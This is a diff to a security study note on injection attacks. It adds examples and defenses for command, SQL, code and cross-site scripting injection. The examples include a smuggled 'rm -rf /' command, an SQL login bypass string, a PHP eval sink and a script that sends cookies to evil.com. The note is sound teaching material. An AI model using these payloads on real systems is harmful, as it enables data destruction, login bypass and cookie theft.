@@ -6,31 +6,50 @@ slug: s4/operating-systems-security/code-injection
 prev: true
 next: true
 dateCreated: 2026-04-23T17:39:39.629Z
-lastUpdatedOn: 2026-05-28T17:03:17.880Z
+lastUpdatedOn: 2026-06-27T08:46:52.690Z
 ---
 
-Injection attacks occur when user input alters program execution.
+Injection attacks occur when unsanitized user input alters program execution or interpretation.
 
 ## Input Validation
 
-Any user input to programs must be validated before use. All user inputs must be untrusted. Length, type, pattern and logical validity must be checked.
+All user input is untrusted. Validate length, type, pattern, and logical constraints before use.
 
-Instead of blocking bad values (aka. _blacklisting_), accept only known valid input (aka. _whitelisting_).
+Prefer whitelisting (accept only known valid values) over blacklisting (block known bad values). Blacklists are incomplete by definition.
 
 ## Types
 
 ### Command Injection
 
-Malicious commands inserted into system calls.
+Attacker inserts OS commands into a string passed to a shell.
+
+Example: application calls `ping <user_input>`. Input `8.8.8.8; rm -rf /` runs both commands.
+
+Defense: avoid shell calls; use exec-family functions with argument arrays; whitelist input characters.
 
 ### SQL Injection
 
-Malicious SQL statements manipulate database queries.
+Attacker inserts SQL syntax into a query string, altering the query's logic.
+
+Example: input `' OR '1'='1` in a login field turns `WHERE password='X'` into `WHERE password='' OR '1'='1'`, bypassing authentication.
+
+Defense: use parameterized queries (prepared statements). Never concatenate user input into SQL strings.
 
 ### Code Injection
 
-Attacker supplies executable code.
+Attacker supplies input that the application evaluates as code.
 
-### Cross-Site Scripting (XSS)
+Example: a PHP app using `eval($_GET['expr'])` runs arbitrary PHP if the parameter is attacker-controlled.
 
-Malicious scripts embedded in web pages.
+Defense: never evaluate user input as code; disable `eval` where possible; enforce strict content types.
+
+### Cross-Site Scripting
+
+Attacker injects a script that executes in another user's browser.
+
+- Stored XSS: malicious script saved in the database and served to all visitors.
+- Reflected XSS: malicious script embedded in a URL and reflected in the response.
+
+Example: comment field stores `<script>document.location='http://evil.com?c='+document.cookie</script>`.
+
+Defense: HTML-encode all output; use Content Security Policy (CSP) headers to restrict script sources; mark cookies `HttpOnly` to prevent script access.
